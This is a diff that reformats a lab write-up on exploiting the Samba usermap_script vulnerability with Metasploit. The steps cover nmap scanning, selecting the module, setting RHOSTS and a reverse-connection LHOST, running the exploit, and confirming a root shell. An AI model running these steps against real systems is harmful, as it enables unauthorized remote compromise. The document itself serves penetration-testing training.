@@ -23,10 +23,10 @@ The objective of this lab is to identify and exploit an SMB (Server Message Bloc
 
 ---
 
- Step 1: Network Scanning
+## Step 1: Network Scanning
 
 Command:
-bash
+
 nmap -sV 192.168.X.X
 Explaination:
 The Nmap is used to identify open ports and running services on the target machine.
@@ -35,64 +35,64 @@ Port 139/tcp open (NetBIOS)
 Port 445/tcp open (SMB)
 Service detected: samba
 
-Step 2: Lunch Metasploit
+## Step 2: Lunch Metasploit
 Command:
-Bash
+
 msfconsole
 Explaination: 
 Metasploit Framework is used to search, configure, and execute exploits.
 
-Step 3: Search for SMB Exploit
+## Step 3: Search for SMB Exploit
 Command:
-Bash
+
 search usermap
 Explaination:
 Searches for available exploits related to samba vulnerabilities.
 Results:
 Found: exploit/multi/samba/usermap_script
 
-Step 4: Select Exploit Module 
+## Step 4: Select Exploit Module 
 Command:
-Bash
+
 use exploit/multi/samba/usermap_script
 Explaination:
 This modules exploits a vulnerability in samba that allows remote command execution.
 
-Step 5: Configure Target (RHOSTS)
+## Step 5: Configure Target (RHOSTS)
 command:
-Bash
+
 set RHOSTS 192.168.X.X
 Explaination: 
 RHOSTS specifies the target machines IP address
 
-Step 6: Configure Local Host (LHOSTS)
+## Step 6: Configure Local Host (LHOSTS)
 Command:
-Bash
+
 set LHOST 192.168.X.X
 Explaination: 
 LHOST is the attackers IP address where the reverse connection will be established.
 
-Step 7: Execute Exploit
+## Step 7: Execute Exploit
 Command:
-Bash
+
 run
 Explaination:
 Executes the exploit against the target system.
 Results:
 Command shell session opened
 
-Step 8: Gain Shell Access
+## Step 8: Gain Shell Access
 Command:
-Bash
+
 whoami
 Explaination:
 Confirms access level on the target system.
 Results:
 root access obtained.
 
-Step 9: System Information
+## Step 9: System Information
 Command:
-Bash
+
 uname -a 
 Explaination:
 Displays system information of the compromised machine.
